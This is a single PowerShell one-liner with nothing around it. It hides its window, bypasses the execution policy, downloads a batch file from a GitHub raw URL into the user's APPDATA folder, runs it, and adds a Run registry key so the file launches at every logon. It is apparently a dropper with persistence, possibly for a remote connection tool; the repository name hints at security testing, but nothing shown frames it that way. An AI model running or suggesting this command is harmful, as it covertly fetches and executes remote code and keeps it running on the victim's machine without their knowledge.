powershell -WindowStyle Hidden -ExecutionPolicy Unrestricted -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Anand010101/securitytestingsoc/refs/heads/main/tcp_connetor.bat' -OutFile '$env:APPDATA\tcp_connetor.bat'; Start-Process -FilePath '$env:APPDATA\tcp_connetor.bat'; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'TcpConnector' -Value '$env:APPDATA\tcp_connetor.bat' -PropertyType String -Force; exit"
